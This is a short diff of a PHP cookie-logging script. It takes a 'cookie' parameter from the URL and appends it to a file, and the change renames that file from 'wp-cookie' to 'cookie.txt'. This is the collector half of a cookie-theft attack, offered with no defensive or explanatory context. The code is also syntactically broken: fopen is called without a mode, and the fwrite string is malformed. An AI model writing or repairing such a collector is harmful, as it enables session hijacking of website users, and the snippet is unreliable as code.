@@ -1,7 +1,7 @@
 <?php
 
 $cookie = $_GET['cookie'];
-$f = fopen('wp-cookie');
+$f = fopen('cookie.txt');
 fwrite($f, "cookie: "$cookie ' ');
 
 
